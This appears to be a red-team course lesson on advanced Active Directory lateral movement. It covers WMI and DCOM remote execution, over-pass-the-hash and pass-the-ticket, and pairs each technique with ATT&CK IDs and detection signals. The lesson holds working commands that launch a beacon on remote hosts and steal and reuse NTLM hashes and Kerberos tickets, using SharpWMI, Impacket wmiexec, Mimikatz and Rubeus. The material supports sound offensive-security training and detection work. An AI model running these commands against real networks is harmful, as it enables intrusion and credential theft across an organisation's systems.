---
title: "Lateral Movement Advanced — WMI, DCOM, Over-Pass-the-Hash, PTK"
tags: [red-team, lateral-movement, WMI, DCOM, pass-the-hash, overpass-the-hash,
  Kerberos, PTK, ATT&CK, T1021]
module: 08-RedTeam-01
day: 498
related_topics:
  - Post-Exploitation Advanced (Day 497)
  - Domain Dominance (Day 499)
  - Kerberoasting and Pass-the-Hash Intro (Day 175)
---

# Day 498 — Lateral Movement Advanced

> "Pass-the-hash is 1997. You need to know it — and you need to know what
> comes after it. Overpass-the-hash, Pass-the-Ticket, DCOM — these are
> how you move through a modern AD environment without loud network
> authentication noise. Blend. Move. Do not leave a bread trail."
>
> — Ghost

---

## Goals

Understand and execute advanced lateral movement techniques without relying on
SMB/PsExec (the noisiest approach).
Implement WMI, DCOM, and Kerberos-based lateral movement from a Sliver beacon.
Map every technique to its ATT&CK sub-technique and detection fingerprint.

**Prerequisites:** Day 497 (credential access), Day 175 (PtH intro), Active
Directory basics.
**Time budget:** 5 hours.

---

## Part 1 — Lateral Movement Taxonomy

```
Technique           Protocol    Credential needed    Noise level
──────────────────────────────────────────────────────────────────
PsExec (classic)    SMB 445     NTLM hash / pass     Very high (Service install)
WMI remote exec     DCOM 135    NTLM hash / pass     Medium (WMI service)
DCOM exec           DCOM 135    NTLM hash / pass     Medium
WinRM               HTTP 5985   NTLM hash / pass     Medium
RDP                 TCP 3389    NTLM hash / pass     High (logon event)
Over-Pass-the-Hash  Kerberos    NTLM hash → TGT      Low-Medium
Pass-the-Ticket     Kerberos    TGT / ST             Low
SSH (if enabled)    TCP 22      password / key       Low
```

**Red team rule:** Default to WMI or DCOM. PsExec only when speed matters
more than stealth. Never RDP unless explicitly needed — it creates logon
events visible to every SOC.

---

## Part 2 — WMI Remote Execution (T1047)

WMI (Windows Management Instrumentation) allows process creation on remote
hosts. No file copy needed — the command runs directly.

### From a Sliver Beacon

```bash
# Use Sliver's wmiexec built-in (if available) or execute-assembly
[beacon] > execute-assembly /path/to/SharpWMI.exe \
    action=exec computername=TARGET.corp.local \
    username="CORP\Administrator" password="Password123" \
    command="C:\Windows\Temp\beacon.exe"
```

### Manual WMI Execution (PowerShell, from a compromised host)

```powershell
# Create a process on a remote host using NTLM credentials
$cred = New-Object System.Management.Automation.PSCredential(
    "CORP\Administrator",
    (ConvertTo-SecureString "Password123" -AsPlainText -Force)
)
Invoke-WmiMethod -Class Win32_Process -Name Create \
    -ArgumentList "C:\Windows\Temp\beacon.exe" \
    -ComputerName TARGET.corp.local \
    -Credential $cred

# OR using WMI COM objects directly (no PowerShell remoting required):
$wmi = [wmiclass]"\\TARGET.corp.local\root\cimv2:Win32_Process"
$wmi.Create("C:\Windows\Temp\beacon.exe")
```

### With Pass-the-Hash (NTLM, no plaintext password)

```bash
# Impacket's wmiexec — pass the NTLM hash
python3 wmiexec.py -hashes :NTLM_HASH_HERE CORP/Administrator@TARGET_IP
# Drops you into an interactive shell over WMI
```

**Detection:**
- Sysmon Event 1: WmiPrvSE.exe spawning child processes on the target.
- Windows Security Event 4688: process creation by WMI service account.
- Sigma: WmiPrvSE.exe as parent of unusual processes.

---

## Part 3 — DCOM Lateral Movement (T1021.003)

DCOM (Distributed COM) exposes Windows COM objects over the network. Some
COM classes allow code execution with minimal detection compared to WMI.

### DCOM ShellWindows / ShellBrowserWindow

```powershell
# On a host with access to the target (no admin required for some DCOM classes)
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', 'TARGET')
$obj = [Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe",
    "/c C:\Windows\Temp\beacon.exe", "C:\Windows\System32", $null, 0)
```

### MMC20 Application DCOM

```powershell
$com = [Type]::GetTypeFromProgID("MMC20.Application", "TARGET")
$obj = [Activator]::CreateInstance($com)
$obj.ActiveView.ExecuteShellCommand("cmd.exe", $null,
    "/c C:\Windows\Temp\beacon.exe", "7")
```

**Detection:** DCOM activation over the network generates Sysmon Event 3
(network connection to port 135 and ephemeral ports). The target will show
`mmc.exe` or `explorer.exe` spawning child processes — more ambiguous than
WMI but still detectable with good rules.

---

## Part 4 — Over-Pass-the-Hash (oPtH) (T1550.002)

Classic Pass-the-Hash (PtH) uses the NTLM hash to authenticate over SMB/WMI
directly. Over-Pass-the-Hash converts an NTLM hash into a Kerberos TGT,
enabling Kerberos-based authentication — which is less suspicious because
Kerberos is the normal auth protocol in Windows domains.

### How It Works

```
Normal Kerberos:
  User enters password → KDC verifies → issues TGT → user uses TGT to get ST

Over-Pass-the-Hash:
  Red team has NTLM hash
  Mimikatz creates a new logon session using the NTLM hash
  Kerberos (LSASS) uses that session to request a TGT from the KDC
  → Result: a valid Kerberos TGT, no plaintext password needed
```

```bash
# Mimikatz oPtH:
mimikatz "sekurlsa::pth /user:Administrator /domain:corp.local \
          /ntlm:NTLM_HASH_HERE /run:powershell.exe"
# Opens a new PowerShell with a TGT for Administrator
# That PowerShell can now use Kerberos for all auth — including to DCs

# In the new shell: verify TGT
klist  # should show a TGT for Administrator@CORP.LOCAL
```

**Why oPtH over PtH:**
- PtH uses NTLM → generates NTLM authentication events (4624, logon type 3).
- oPtH uses Kerberos → generates Kerberos events (4768, 4769) — more normal.
- Kerberos tickets are harder to block selectively.

---

## Part 5 — Pass-the-Ticket (PtT) (T1550.003)

If you have stolen a Kerberos ticket (TGT or Service Ticket), import it
directly into the current session. No hash needed — the ticket is the credential.

### Steal and Inject a TGT

```bash
# From Mimikatz or Sliver beacon on a compromised host:
# List all tickets on the system:
mimikatz "kerberos::list /export"
# → exports .kirbi ticket files (TGTs and STs)

# On attacker machine, inject the TGT:
mimikatz "kerberos::ptt admin.kirbi"
# → the current session now has admin's Kerberos tickets

# Verify:
klist    # shows admin's TGT loaded in current session
# Now: dir \\DC.corp.local\C$  → authenticates as admin
```

### Steal Using Rubeus (C#, loadable via execute-assembly)

```bash
[beacon] > execute-assembly /path/to/Rubeus.exe dump /nowrap
# Dumps all Kerberos tickets from all sessions (requires admin)

[beacon] > execute-assembly /path/to/Rubeus.exe ptt /ticket:BASE64_TICKET
# Imports a ticket (base64 encoded .kirbi)
```

**Detection:**
- TGT requests from unusual hosts or times (Event 4768).
- Ticket injection generates no authentication event on the source machine.
- On the target: Event 4624 (logon type 3) — but the source IP is the attacking host.

---

## Part 6 — Movement Decision Framework

```
You have: NTLM hash
  → Try oPtH to get a Kerberos TGT (less noise)
  → If oPtH unavailable: use Impacket's wmiexec or psexec with the hash

You have: Kerberos TGT
  → Inject with Rubeus ptt → authenticate to any service using Kerberos
  → Target high-value: CIFS (file shares), LDAP (AD queries), HTTP (web apps)

You have: plaintext credential
  → All of the above, plus interactive logon if needed

You need to move to a host on a different subnet
  → Set up a SOCKS5 proxy via current beacon
  → Route Impacket tools through proxychains

You need to avoid all network lateral movement tools
  → Find a living-off-the-land alternative:
  PowerShell remoting, WMI, scheduled tasks over SMB
```

---

## ATT&CK Mapping

| Technique | ATT&CK ID | Detection primary signal |
|---|---|---|
| WMI remote execution | T1047 | WmiPrvSE.exe parent of new process |
| DCOM execution | T1021.003 | DCOM network activation + unusual child |
| Pass-the-Hash | T1550.002 | Event 4624 logon type 3 + NTLM auth |
| Over-Pass-the-Hash | T1550.002 | Event 4768 (TGT request) from new host |
| Pass-the-Ticket | T1550.003 | Kerberos auth from unusual source |

---

## Key Takeaways

1. Default to WMI or DCOM for lateral movement. PsExec is the loudest option
   and should be a last resort when stealth matters.
2. Over-Pass-the-Hash converts an NTLM hash into a Kerberos TGT. The resulting
   traffic looks like normal Kerberos authentication — harder to distinguish
   from legitimate activity.
3. Pass-the-Ticket requires a stolen ticket (TGT or ST). Once injected, the
   session behaves as the ticket's owner for all subsequent auth.
4. Sysmon Event 1 (WmiPrvSE.exe spawning processes) and Event 3 (DCOM activation)
   are the primary detection signals. SOC rules should alert on WmiPrvSE.exe
   as a parent of non-standard processes.
5. Always route lateral movement through the existing beacon when the target
   is on a different subnet. Use SOCKS5 proxying, not a new direct connection.

---

## Exercises

1. Use Impacket's `wmiexec.py` with a harvested NTLM hash to execute `whoami`
   on a second lab VM. Record the Sysmon events on the target.
2. Implement Over-Pass-the-Hash with Mimikatz on the lab DC. Verify the
   resulting TGT with `klist`. Use the TGT to access `\\DC\C$`.
3. Dump all Kerberos tickets with Rubeus on a compromised host. Identify which
   tickets could be used for lateral movement (TGTs vs STs, their target SPNs).
4. Write a Sigma rule that detects WMI lateral movement: WmiPrvSE.exe creating
   a process that is not in a standard Windows process allowlist.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q498.1, Q498.2 …).

---

## Navigation

← Previous: [Day 497 — Post-Exploitation Advanced](DAY-0497-Post-Exploitation-Advanced.md)
→ Next: [Day 499 — Domain Dominance](DAY-0499-Domain-Dominance.md)
